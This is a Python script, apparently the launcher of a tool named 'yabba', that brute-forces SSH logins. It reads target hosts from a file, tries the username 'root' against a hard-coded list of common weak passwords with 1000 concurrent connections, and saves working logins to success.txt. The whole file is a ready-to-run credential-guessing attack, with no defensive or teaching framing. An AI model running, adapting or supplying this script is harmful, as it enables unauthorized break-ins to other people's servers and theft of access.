from argparse import ArgumentParser, ArgumentTypeError
from yabba.io import combo_factory, target_factory, value_factory
import asyncio
import os
import yabba


MODULES = [
    "ssh",
]


class Types:
    @staticmethod
    def file(filename):
        if not os.path.isfile(filename):
            raise ArgumentTypeError("File '{}' does not exist".format(filename))
        return filename


TOP_USERNAMES = ["root"]
TOP_PASSWORDS = [#"000000", "1111", "111111", "11111111", "112233", "121212", "123123", "123321", "1234", "12345",
                 # "123456", "1234567", "12345678", "123456789", "1234567890", "123qwe", "131313", "159753", "1qaz2wsx",
                 # "2000", "555555", "654321", "666666", "6969", "696969", "777777", "7777777", "987654321", "aaaaaa",
                 "abc123", "access", "amanda", "andrew", "asdfgh", "ashley", "asshole", "austin", "baseball", "batman",
                 "biteme", "buster", "charlie", "cheese", "chelsea", "computer", "dallas", "daniel", "dragon",
                 "football", "freedom", "fuck", "fuckme", "fuckyou", "george", "ginger", "harley", "hockey", "hunter",
                 "iloveyou", "jennifer", "jessica", "jordan", "joshua", "killer", "klaster", "letmein", "love",
                 "maggie", "master", "matrix", "matthew", "michael", "michelle", "monkey", "mustang", "nicole", "pass",
                 "password", "pepper", "princess", "pussy", "qazwsx", "qwerty", "qwertyuiop", "ranger", "robert",
                 "shadow", "soccer", "starwars", "summer", "sunshine", "superman", "taylor", "thomas", "thunder",
                 "tigger", "trustno1", "yankees", "zxcvbn", "zxcvbnm"]


async def main():
    await yabba.ssh_brute(
        target_factory = target_factory("hosts.txt", default_port=22),
        username_factory = value_factory(TOP_USERNAMES),
        password_factory = value_factory(TOP_PASSWORDS),
        # target_factory = value_factory([("test.rebex.net", 22)]),
        # username_factory = value_factory(["test", "demo"]),
        # password_factory = value_factory(["example", "password"]),
        pool_size=1000,
        timeout=2.5,
        verbose=True,
        output="success.txt",
    )


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    finally:
        loop.close()

